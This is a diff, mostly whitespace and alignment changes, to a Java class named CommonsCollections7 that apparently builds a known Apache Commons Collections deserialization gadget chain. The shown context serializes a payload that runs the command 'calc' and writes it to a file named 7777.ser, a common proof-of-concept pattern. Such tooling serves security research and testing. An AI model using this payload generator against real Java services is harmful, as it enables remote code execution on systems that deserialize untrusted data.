@@ -8,6 +8,7 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
+
 import java.io.ByteArrayOutputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
@@ -18,8 +19,8 @@ import java.util.Map;
 
 public class CommonsCollections7 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous = new FileOutputStream("7777.ser");
+        byte[]           bytes = getBytes(PayloadType.command, "calc");
+        FileOutputStream fous  = new FileOutputStream("7777.ser");
         fous.write(bytes);
         fous.close();
     }
@@ -64,7 +65,7 @@ public class CommonsCollections7 {
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baous);
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
         oos.writeObject(hashtable);
         byte[] bytes = baous.toByteArray();
         oos.close();
